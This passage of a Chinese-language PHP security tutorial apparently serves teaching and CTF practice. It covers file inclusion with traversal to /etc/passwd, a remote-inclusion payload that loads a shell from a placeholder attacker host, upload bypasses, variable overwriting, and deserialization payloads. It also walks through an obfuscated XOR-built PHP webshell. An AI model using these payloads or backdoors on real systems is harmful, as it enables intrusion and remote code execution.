<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="s1">&#39;/home/wwwrun/&#39;</span><span class="o">.</span><span class="nv">$file</span><span class="o">.</span><span class="s1">&#39;.php&#39;</span><span class="p">))</span> <span class="p">{</span>
  <span class="k">include</span> <span class="s1">&#39;/home/wwwrun/&#39;</span><span class="o">.</span><span class="nv">$file</span><span class="o">.</span><span class="s1">&#39;.php&#39;</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<p>上述代码存在本地文件包含，可用 %00 截断的方式读取 <code>/etc/passwd</code> 文件内容。</p>
<ul>
<li><code>%00</code> 截断</li>
</ul>
<div class="codehilite"><pre><span></span>?file=../../../../../../../../../etc/passwd%00
</pre></div>

<p>需要 <code>magic_quotes_gpc=off</code>，PHP 小于 5.3.4 有效。</p>
<ul>
<li>路径长度截断</li>
</ul>
<div class="codehilite"><pre><span></span>?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.
</pre></div>

<p>Linux 需要文件名长于 4096，Windows 需要长于 256。</p>
<ul>
<li>点号截断</li>
</ul>
<div class="codehilite"><pre><span></span>?file=../../../../../../../../../boot.ini/………[…]…………
</pre></div>

<p>只适用 Windows，点号需要长于 256。</p>
<h3 id="_3">远程文件包含<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
<p>远程文件包含，Remote File Inclusion，RFI。</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$route</span> <span class="o">==</span> <span class="s2">&quot;share&quot;</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">require_once</span> <span class="nv">$basePath</span> <span class="o">.</span> <span class="s2">&quot;/action/m_share.php&quot;</span><span class="p">;</span>
<span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$route</span> <span class="o">==</span> <span class="s2">&quot;sharelink&quot;</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">require_once</span> <span class="nv">$basePath</span> <span class="o">.</span> <span class="s2">&quot;/action/m_sharelink.php&quot;</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>

<p>构造变量 <code>basePath</code> 的值。</p>
<div class="codehilite"><pre><span></span>/?basePath=http://attacker/phpshell.txt?
</pre></div>

<p>最终的代码执行了</p>
<div class="codehilite"><pre><span></span><span class="x">require_once &quot;http://attacker/phpshell.txt?/action/m_share.php&quot;;</span>
</pre></div>

<p>问号后的部分被解释为 URL 的 querystring，这也是一种「截断」。</p>
<ul>
<li>普通远程文件包含</li>
</ul>
<div class="codehilite"><pre><span></span>?file=[http|https|ftp]://example.com/shell.txt
</pre></div>

<p>需要 <code>allow_url_fopen=On</code> 并且 <code>allow_url_include=On</code> 。</p>
<ul>
<li>利用 PHP 流 input</li>
</ul>
<div class="codehilite"><pre><span></span>?file=php://input
</pre></div>

<p>需要 <code>allow_url_include=On</code> 。</p>
<ul>
<li>利用 PHP 流 filter</li>
</ul>
<div class="codehilite"><pre><span></span>?file=php://filter/convert.base64-encode/resource=index.php
</pre></div>

<p>需要 <code>allow_url_include=On</code> 。</p>
<ul>
<li>利用 data URIs</li>
</ul>
<div class="codehilite"><pre><span></span>?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=
</pre></div>

<p>需要 <code>allow_url_include=On</code> 。</p>
<ul>
<li>利用 XSS 执行</li>
</ul>
<div class="codehilite"><pre><span></span>?file=http://127.0.0.1/path/xss.php?xss=phpcode
</pre></div>

<p>需要 <code>allow_url_fopen=On</code>，<code>allow_url_include=On</code> 并且防火墙或者白名单不允许访问外网时，先在同站点找一个 XSS 漏洞，包含这个页面，就可以注入恶意代码了。</p>
<h2 id="_4">文件上传<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<p>文件上传漏洞是指用户上传了一个可执行脚本文件，并通过此文件获得了执行服器端命令的能力。在大多数情况下，文件上传漏洞一般是指上传 WEB 脚本能够被服务器解析的问题，也就是所谓的 webshell 问题。完成这一攻击需要这样几个条件，一是上传的文件能够这 WEB 容器执行，其次用户能从 WEB 上访问这个文件，最后，如果上传的文件被安全检查、格式化、图片压缩等功能改变了内容，则可能导致攻击失败。</p>
<h3 id="_5">绕过上传检查<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
<ul>
<li>前端检查扩展名</li>
</ul>
<p>抓包绕过即可。</p>
<ul>
<li><code>Content-Type</code> 检测文件类型</li>
</ul>
<p>抓包修改 <code>Content-Type</code> 类型，使其符合白名单规则。</p>
<ul>
<li>服务端添加后缀</li>
</ul>
<p>尝试 <code>%00</code> 截断。</p>
<ul>
<li>服务端扩展名检测</li>
</ul>
<p>利用解析漏洞。</p>
<ul>
<li>Apache 解析</li>
</ul>
<p><code>phpshell.php.rar.rar.rar.rar</code> 因为 Apache 不认识 <code>.rar</code> 这个文件类型，所以会一直遍历后缀到 <code>.php</code>，然后认为这是一个 PHP 文件。</p>
<ul>
<li>IIS 解析</li>
</ul>
<p>IIS 6 下当文件名为 <code>abc.asp;xx.jpg</code> 时，会将其解析为 <code>abc.asp</code>。</p>
<ul>
<li>PHP CGI 路径解析</li>
</ul>
<p>当访问 <code>http://www.a.com/path/test.jpg/notexist.php</code> 时，会将 <code>test.jpg</code> 当做 PHP 解析， <code>notexist.php</code> 是不存在的文件。此时 Nginx 的配置如下</p>
<div class="codehilite"><pre><span></span><span class="k">location</span> <span class="p">~</span> <span class="sr">\.php$</span> <span class="p">{</span>
  <span class="kn">root</span> <span class="s">html</span><span class="p">;</span>
  <span class="kn">fastcgi_pass</span> <span class="n">127.0.0.1</span><span class="p">:</span><span class="mi">9000</span><span class="p">;</span>
  <span class="kn">fastcgi_index</span> <span class="s">index.php</span><span class="p">;</span>
  <span class="kn">fastcgi_param</span> <span class="s">SCRIPT_FILENAME</span> <span class="s">/scripts</span><span class="nv">$fastcgi_script_name</span><span class="p">;</span>
  <span class="kn">include</span> <span class="s">fastcgi_param</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>

<ul>
<li>其他方式</li>
</ul>
<p>后缀大小写、双写、特殊后缀如 <code>php5</code> 等，修改包内容的大小写过 WAF 等。</p>
<h2 id="_6">变量覆盖<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
<h3 id="_7">全局变量覆盖<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
<p>变量如果未被初始化，且能够用户所控制，那么很可能会导致安全问题。</p>
<div class="codehilite"><pre><span></span><span class="na">register_globals</span><span class="o">=</span><span class="s">ON</span>
</pre></div>

<p>示例</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">echo</span> <span class="s2">&quot;Register_globals: &quot;</span> <span class="o">.</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;register_globals&quot;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&lt;br/&gt;&quot;</span><span class="p">;</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$auth</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">echo</span> <span class="s2">&quot;private!&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<p>当 <code>register_globals=ON</code> 时，提交 <code>test.php?auth=1</code>，<code>auth</code> 变量将自动得到赋值。</p>
<h3 id="extract"><code>extract()</code> 变量覆盖<a class="headerlink" href="#extract" title="Permanent link">&para;</a></h3>
<p><code>extract()</code> 函数能够将变量从数组导入到当前的符号表，其定义为</p>
<div class="codehilite"><pre><span></span>int extract ( array $var_array [, int $extract_type [, string $prefix ]] )
</pre></div>

<p>其中，第二个参数指定函数将变量导入符号表时的行为，最常见的两个值是 <code>EXTR_OVERWRITE</code> 和 <code>EXTR_SKIP</code>。</p>
<p>当值为 <code>EXTR_OVERWRITE</code> 时，在将变量导入符号表的过程中，如果变量名发生冲突，则覆盖所有变量；值为 <code>EXTR_SKIP</code> 则表示跳过不覆盖。若第二个参数未指定，则在默认情况下使用 <code>EXTR_OVERWRITE</code>。</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$auth</span> <span class="o">=</span> <span class="s2">&quot;0&quot;</span><span class="p">;</span>
<span class="nb">extract</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$auth</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">echo</span> <span class="s2">&quot;private!&quot;</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
  <span class="k">echo</span> <span class="s2">&quot;public!&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<p>当 <code>extract()</code> 函数从用户可以控制的数组中导出变量时，可能发生变量覆盖。</p>
<h3 id="import_request_variables"><code>import_request_variables</code> 变量覆盖<a class="headerlink" href="#import_request_variables" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span>bool import_request_variables (string $types [, string $prefix])
</pre></div>

<p><code>import_request_variables</code> 将 GET、POST、Cookies 中的变量导入到全局，使用这个函数只用简单地指定类型即可。</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$auth</span> <span class="o">=</span> <span class="s2">&quot;0&quot;</span><span class="p">;</span>
<span class="nb">import_request_variables</span><span class="p">(</span><span class="s2">&quot;G&quot;</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$auth</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">echo</span> <span class="s2">&quot;private!&quot;</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
  <span class="k">echo</span> <span class="s2">&quot;public!&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<p><code>import_request_variables("G")</code> 指定导入 GET 请求中的变量，提交 <code>test.php?auth=1</code> 出现变量覆盖。</p>
<h3 id="parse_str"><code>parse_str()</code> 变量覆盖<a class="headerlink" href="#parse_str" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span>void parse_str ( string $str [, array &amp;$arr ])
</pre></div>

<p><code>parse_str()</code> 函数通常用于解析 URL 中的 querystring，但是当参数值可以被用户控制时，很可能导致变量覆盖。</p>
<div class="codehilite"><pre><span></span><span class="x">// var.php?var=new  变量覆盖</span>
<span class="x">$var = &quot;init&quot;;</span>
<span class="x">parse_str($_SERVER[&quot;QUERY_STRING&quot;]);</span>
<span class="x">print $var;</span>
</pre></div>

<p>与 <code>parse_str()</code> 类似的函数还有 <code>mb_parse_str()</code>。</p>
<h2 id="_8">命令执行<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h2>
<h3 id="_9">直接执行代码<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
<p>PHP 中有不少可以直接执行代码的函数。</p>
<div class="codehilite"><pre><span></span><span class="x">eval();</span>
<span class="x">assert();</span>
<span class="x">system();</span>
<span class="x">exec();</span>
<span class="x">shell_exec();</span>
<span class="x">passthru();</span>
<span class="x">escapeshellcmd();</span>
<span class="x">pcntl_exec();</span>
<span class="x">......</span>
</pre></div>

<h3 id="preg_replace"><code>preg_replace()</code> 代码执行<a class="headerlink" href="#preg_replace" title="Permanent link">&para;</a></h3>
<p><code>preg_replace()</code> 的第一个参数如果存在 <code>/e</code> 模式修饰符，则允许代码执行。</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$var</span> <span class="o">=</span> <span class="s2">&quot;&lt;tag&gt;phpinfo()&lt;/tag&gt;&quot;</span><span class="p">;</span>
<span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/&lt;tag&gt;(.*?)&lt;\/tag&gt;/e&quot;</span><span class="p">,</span> <span class="s2">&quot;addslashes(</span><span class="se">\\</span><span class="s2">1)&quot;</span><span class="p">,</span> <span class="nv">$var</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<p>如果没有 <code>/e</code> 修饰符，可以尝试 %00 截断。</p>
<h3 id="preg_match"><code>preg_match</code> 代码执行<a class="headerlink" href="#preg_match" title="Permanent link">&para;</a></h3>
<p><code>preg_match</code> 执行的是匹配正则表达式，如果匹配成功，则允许代码执行。</p>
<div class="codehilite"><pre><span></span>&lt;?php
include &#39;flag.php&#39;;
if(isset($_GET[&#39;code&#39;])){
    $code = $_GET[&#39;code&#39;];
    if(strlen($code)&gt;40){
        die(&quot;Long.&quot;);
    }
    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)){
        die(&quot;NO.&quot;);
    }
    @eval($code);
}else{
    highlight_file(__FILE__);
}
//$hint =  &quot;php function getFlag() to get flag&quot;;
?&gt;
</pre></div>

<p>这道题是 <code>xman</code> 训练赛的时候，梅子酒师傅出的一道题。这一串代码描述是这样子，我们要绕过 <code>A-Z</code>、<code>a-z</code>、<code>0-9</code> 这些常规数字、字母字符串的传参，将非字母、数字的字符经过各种变换，最后能构造出 <code>a-z</code> 中任意一个字符，并且字符串长度小于 <code>40</code> 。然后再利用 <code>PHP</code> 允许动态函数执行的特点，拼接出一个函数名，这里我们是 <code>getFlag</code>，然后动态执行该代码即可。</p>
<p>那么，我们需要考虑的问题是如何通过各种变换，使得我们能够去成功读取到 <code>getFlag</code> 函数，然后拿到 <code>webshell</code> 。</p>
<p>在理解这个之前，我们首先需要大家了解的是 <code>PHP</code> 中异或 <code>^</code> 的概念。</p>
<p>我们先看一下下面这段代码：</p>
<div class="codehilite"><pre><span></span>&lt;?php
    echo &quot;A&quot;^&quot;?&quot;;
?&gt;
</pre></div>

<p>运行结果如下：</p>
<p><img alt="" src="../figure/preg_match/answer1.png" /></p>
<p>我们可以看到，输出的结果是字符 <code>~</code>。之所以会得到这样的结果，是因为代码中对字符 <code>A</code> 和字符 <code>?</code> 进行了异或操作。在 <code>PHP</code> 中，两个变量进行异或时，先会将字符串转换成 <code>ASCII</code> 值，再将 <code>ASCII</code> 值转换成二进制再进行异或，异或完，又将结果从二进制转换成了 <code>ASCII</code> 值，再将 <code>ASCII</code> 值转换成字符串。异或操作有时也被用来交换两个变量的值。</p>
<p>比如像上面这个例子</p>
<p><code>A</code> 的 <code>ASCII</code> 值是 <code>65</code> ，对应的二进制值是 <code>01000001</code></p>
<p><code>?</code> 的ASCII值是 <code>63</code> ，对应的二进制值是 <code>00111111</code></p>
<p>异或的二进制的值是 <code>‭01111110‬</code> ，对应的 <code>ASCII</code> 值是 <code>126</code> ，对应的字符串的值就是 <code>~</code> 了</p>
<p>我们都知道， <code>PHP</code> 是弱类型的语言，也就是说在 <code>PHP</code> 中我们可以不预先声明变量的类型，而直接声明一个变量并进行初始化或赋值操作。正是由于 <code>PHP</code> 弱类型的这个特点，我们对 <code>PHP</code> 的变类型进行隐式的转换，并利用这个特点进行一些非常规的操作。如将整型转换成字符串型，将布尔型当作整型，或者将字符串当作函数来处理，下面我们来看一段代码：</p>
<div class="codehilite"><pre><span></span>&lt;?php
    function B(){
        echo &quot;Hello Angel_Kitty&quot;;
    }
    $_++;
    $__= &quot;?&quot; ^ &quot;}&quot;;
    $__();
?&gt;
</pre></div>

<p>代码执行结果如下：</p>
<p><img alt="" src="../figure/preg_match/answer2.png" /></p>
<p>我们一起来分析一下上面这段代码：</p>
<p>1、<code>$_++;</code> 这行代码的意思是对变量名为 <code>"_"</code> 的变量进行自增操作，在 <code>PHP</code> 中未定义的变量默认值 <code>null</code> ，<code>null==false==0</code> ，我们可以在不使用任何数字的情况下，通过对未定义变量的自增操作来得到一个数字。</p>
<p>2、<code>$__="?" ^ "}";</code> 对字符 <code>?</code> 和 <code>}</code> 进行异或运算，得到结果 <code>B</code> 赋给变量名为 <code>__</code> (两个下划线)的变量</p>
<p>3、<code>$ __ ();</code> 通过上面的赋值操作，变量 <code>$__</code> 的值为 <code>B</code> ，所以这行可以看作是 <code>B()</code> ，在 <code>PHP</code> 中，这行代码表示调用函数 <code>B</code> ，所以执行结果为 <code>Hello Angel_Kitty</code> 。在 <code>PHP</code> 中，我们可以将字符串当作函数来处理。</p>
<p>看到这里，相信大家如果再看到类似的 <code>PHP</code> 后门应该不会那么迷惑了，你可以通过一句句的分析后门代码来理解后门想实现的功能。</p>
<p>我们希望使用这种后门创建一些可以绕过检测的并且对我们有用的字符串，如 <code>_POST</code> ， <code>system</code> ， <code>call_user_func_array</code>，或者是任何我们需要的东西。</p>
<p>下面是个非常简单的非数字字母的 <code>PHP</code> 后门：</p>
<div class="codehilite"><pre><span></span>&lt;?php
    @$_++; // $_ = 1
    $__=(&quot;#&quot;^&quot;|&quot;); // $__ = _
    $__.=(&quot;.&quot;^&quot;~&quot;); // _P
    $__.=(&quot;/&quot;^&quot;`&quot;); // _PO
    $__.=(&quot;|&quot;^&quot;/&quot;); // _POS
    $__.=(&quot;{&quot;^&quot;/&quot;); // _POST 
    ${$__}[!$_](${$__}[$_]); // $_POST[0]($_POST[1]);
?&gt;
</pre></div>

<p>在这里我说明下， <code>.=</code> 是字符串的连接，具体参看 <code>PHP</code> 语法</p>
<p>我们甚至可以将上面的代码合并为一行，从而使程序的可读性更差，代码如下：</p>
<div class="codehilite"><pre><span></span>$__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;{&quot;^&quot;/&quot;);
</pre></div>

<p>我们回到 <code>xman</code> 训练赛的那题来看，我们的想法是通过构造异或来去绕过那串字符，那么我们该如何构造这个字串使得长度小于 <code>40</code> 呢？</p>
<p>我们最终是要读取到那个 <code>getFlag</code> 函数，我们需要构造一个 <code>_GET</code> 来去读取这个函数，我们最终构造了如下字符串：</p>
<p><img alt="" src="../figure/preg_match/payloads.png" /></p>
<p>可能很多小伙伴看到这里仍然无法理解这段字符串是如何构造的吧，我们就对这段字符串进行段分析。</p>
<h4 id="_get">构造 <code>_GET</code> 读取<a class="headerlink" href="#_get" title="Permanent link">&para;</a></h4>
<p>首先我们得知道 <code>_GET</code> 由什么异或而来的，经过我的尝试与分析，我得出了下面的结论：</p>
<div class="codehilite"><pre><span></span>&lt;?php
    echo &quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;//_GET
?&gt;
</pre></div>

<p>这段代码一大坨是啥意思呢？因为40个字符长度的限制，导致以前逐个字符异或拼接的webshell不能使用。<br />
这里可以使用php中可以执行命令的反引号 <code>`</code> 和 <code>Linux</code> 下面的通配符 <code>?</code></p>
<ul>
<li><code>?</code> 代表匹配一个字符</li>
<li><code>`</code> 表示执行命令</li>
<li><code>"</code> 对特殊字符串进行解析</li>
</ul>
<p>由于 <code>?</code> 只能匹配一个字符，这种写法的意思是循环调用，分别匹配。我们将其进行分解来看：</p>
<div class="codehilite"><pre><span></span>&lt;?php
    echo &quot;{&quot;^&quot;&lt;&quot;;
?&gt;
</pre></div>

<p>输出结果为：</p>
<p><img alt="" src="../figure/preg_match/answer3.png" /></p>
<div class="codehilite"><pre><span></span>&lt;?php
    echo &quot;{&quot;^&quot;&gt;&quot;;
?&gt;
</pre></div>

<p>输出结果为：</p>
<p><img alt="" src="../figure/preg_match/answer4.png" /></p>
<div class="codehilite"><pre><span></span>&lt;?php
    echo &quot;{&quot;^&quot;/&quot;;
?&gt;
</pre></div>

<p>输出结果为：</p>
<p><img alt="" src="../figure/preg_match/answer5.png" /></p>
<p>所以我们可以知道， <code>_GET</code> 就是这么被构造出来的啦！</p>
<h4 id="_get_1">获取 <code>_GET</code> 参数<a class="headerlink" href="#_get_1" title="Permanent link">&para;</a></h4>
<p>我们又该如何获取 <code>_GET</code> 参数呢？咱们可以构造出如下字串：</p>
<div class="codehilite"><pre><span></span>&lt;?php
    echo ${$_}[_](${$_}[__]);//$_GET[_]($_GET[__])
?&gt;
</pre></div>

<p>根据前面构造的来看， <code>$_</code> 已经变成了 <code>_GET</code> 。顺理成章的来讲， <code>$_ = _GET</code> 。我们构建 <code>$_GET[__]</code> 是为了要获取参数值。</p>
<h4 id="_10">传入参数<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h4>
<p>此时我们只需要去调用 <code>getFlag</code> 函数获取 <code>webshell</code> 就好了，构造如下：</p>
<div class="codehilite"><pre><span></span>&lt;?php
    echo $_=getFlag;//getFlag
?&gt;
</pre></div>

<p>所以把参数全部连接起来，就可以了。</p>
<p><img alt="" src="../figure/preg_match/payloads.png" /></p>
<p>结果如下：</p>
<p><img alt="" src="../figure/preg_match/flag.png" /></p>
<p>于是我们就成功地读取到了flag！</p>
<h3 id="_11">动态函数执行<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
<p>用户自定义的函数可以导致代码执行。</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$dyn_func</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;dyn_func&quot;</span><span class="p">];</span>
<span class="nv">$argument</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;argument&quot;</span><span class="p">];</span>
<span class="nv">$dyn_func</span><span class="p">(</span><span class="nv">$argument</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<h3 id="_12">反引号命令执行<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">echo</span> <span class="sb">`ls -al`</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<h3 id="curly-syntax">Curly Syntax<a class="headerlink" href="#curly-syntax" title="Permanent link">&para;</a></h3>
<p>PHP 的 Curly Syntax 也能导致代码执行，它将执行花括号间的代码，并将结果替换回去。</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$var</span> <span class="o">=</span> <span class="s2">&quot;aaabbbccc </span><span class="si">${</span><span class="nv">`ls`</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$foobar</span> <span class="o">=</span> <span class="s2">&quot;phpinfo&quot;</span><span class="p">;</span>
<span class="err">$</span><span class="p">{</span><span class="s2">&quot;foobar&quot;</span><span class="p">}();</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<h3 id="_13">回调函数<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h3>
<p>很多函数都可以执行回调函数，当回调函数用户可控时，将导致代码执行。</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$evil_callback</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;callback&quot;</span><span class="p">];</span>
<span class="nv">$some_array</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>
<span class="nv">$new_array</span> <span class="o">=</span> <span class="nb">array_map</span><span class="p">(</span><span class="nv">$evil_callback</span><span class="p">,</span> <span class="nv">$some_array</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<p>攻击 payload</p>
<div class="codehilite"><pre><span></span>http://www.a.com/index.php?callback=phpinfo
</pre></div>

<h3 id="_14">反序列化<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h3>
<p>如果 <code>unserialize()</code> 在执行时定义了 <code>__destruct()</code> 或 <code>__wakeup()</code> 函数，则有可能导致代码执行。</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">class</span> <span class="nc">Example</span> <span class="p">{</span>
  <span class="k">var</span> <span class="nv">$var</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
  <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">var</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;saved_code&quot;</span><span class="p">]);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<p>攻击 payload</p>
<div class="codehilite"><pre><span></span>http://www.a.com/index.php?saved_code=O:7:&quot;Example&quot;:1:{s:3:&quot;var&quot;;s:10:&quot;phpinfo();&quot;;}
</pre></div>

<h2 id="php">PHP 特性<a class="headerlink" href="#php" title="Permanent link">&para;</a></h2>
<h3 id="_15">数组<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$var</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="nv">$var</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="nv">$var</span> <span class="o">=</span> <span class="s2">&quot;string&quot;</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<p>php 不会严格检验传入的变量类型，也可以将变量自由的转换类型。</p>
<p>比如在 <code>$a == $b</code> 的比较中</p>
<div class="codehilite"><pre><span></span><span class="x">$a = null; </span>
<span class="x">$b = false; //为真 </span>
<span class="x">$a = &#39;&#39;; </span>
<span class="x">$b = 0; //同样为真</span>
</pre></div>

<p>然而，PHP 内核的开发者原本是想让程序员借由这种不需要声明的体系，更加高效的开发，所以在几乎所有内置函数以及基本结构中使用了很多松散的比较和转换，防止程序中的变量因为程序员的不规范而频繁的报错，然而这却带来了安全问题。</p>
<div class="codehilite"><pre><span></span><span class="x">0==&#39;0&#39; //true</span>
<span class="x">0 == &#39;abcdefg&#39; //true</span>
<span class="x">0 === &#39;abcdefg&#39; //false</span>
<span class="x">1 == &#39;1abcdef&#39; //true</span>
</pre></div>

<h3 id="hash">魔法 Hash<a class="headerlink" href="#hash" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><span class="x">&quot;0e132456789&quot;==&quot;0e7124511451155&quot; //true</span>
<span class="x">&quot;0e123456abc&quot;==&quot;0e1dddada&quot; //false</span>
<span class="x">&quot;0e1abc&quot;==&quot;0&quot;  //true</span>
</pre></div>

<p>在进行比较运算时，如果遇到了 <code>0e\d+</code> 这种字符串，就会将这种字符串解析为科学计数法。所以上面例子中 2 个数的值都是 0 因而就相等了。如果不满足 <code>0e\d+</code> 这种模式就不会相等。</p>
<h3 id="_16">十六进制转换<a class="headerlink" href="#_16" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><span class="x">&quot;0x1e240&quot;==&quot;123456&quot; //true</span>
<span class="x">&quot;0x1e240&quot;==123456 //true</span>
<span class="x">&quot;0x1e240&quot;==&quot;1e240&quot; //false</span>
</pre></div>

<p>当其中的一个字符串是 <code>0x</code> 开头的时候，PHP 会将此字符串解析成为十进制然后再进行比较，<code>0x1240</code> 解析成为十进制就是 123456，所以与 <code>int</code> 类型和 <code>string</code> 类型的 123456 比较都是相等。</p>
<h3 id="_17">类型转换<a class="headerlink" href="#_17" title="Permanent link">&para;</a></h3>
<p>常见的转换主要就是 <code>int</code> 转换为 <code>string</code>，<code>string</code> 转换为 <code>int</code>。</p>
<p><code>int</code> 转 <code>string</code></p>
<div class="codehilite"><pre><span></span><span class="x">$var = 5;</span>
<span class="x">方式1：$item = (string)$var;</span>
<span class="x">方式2：$item = strval($var);</span>
</pre></div>

<p><code>string</code> 转 <code>int</code>：<code>intval()</code> 函数。</p>
<p>对于这个函数，可以先看 2 个例子。</p>
<div class="codehilite"><pre><span></span><span class="x">var_dump(intval(&#39;2&#39;)) //2</span>
<span class="x">var_dump(intval(&#39;3abcd&#39;)) //3</span>
<span class="x">var_dump(intval(&#39;abcd&#39;)) //0</span>
</pre></div>

<p>说明 <code>intval()</code> 转换的时候，会将从字符串的开始进行转换知道遇到一个非数字的字符。即使出现无法转换的字符串， <code>intval()</code> 不会报错而是返回 0。</p>
<p>同时，程序员在编程的时候也不应该使用如下的这段代码：</p>
<div class="codehilite"><pre><span></span><span class="x">if(intval($a)&gt;1000) {</span>
<span class="x"> mysql_query(&quot;select * from news where id=&quot;.$a)</span>
<span class="x">}</span>
</pre></div>

<p>这个时候 <code>$a</code> 的值有可能是 <code>1002 union</code>。</p>
<h3 id="_18">内置函数的参数的松散性<a class="headerlink" href="#_18" title="Permanent link">&para;</a></h3>
<p>内置函数的松散性说的是，调用函数时给函数传递函数无法接受的参数类型。解释起来有点拗口，还是直接通过实际的例子来说明问题，下面会重点介绍几个这种函数。</p>
<p><strong>md5()</strong></p>
<div class="codehilite"><pre><span></span><span class="x">$array1[] = array(</span>
<span class="x"> &quot;foo&quot; =&gt; &quot;bar&quot;,</span>
<span class="x"> &quot;bar&quot; =&gt; &quot;foo&quot;,</span>
<span class="x">);</span>
<span class="x">$array2 = array(&quot;foo&quot;, &quot;bar&quot;, &quot;hello&quot;, &quot;world&quot;);</span>
<span class="x">var_dump(md5($array1)==var_dump($array2)); //true</span>
</pre></div>

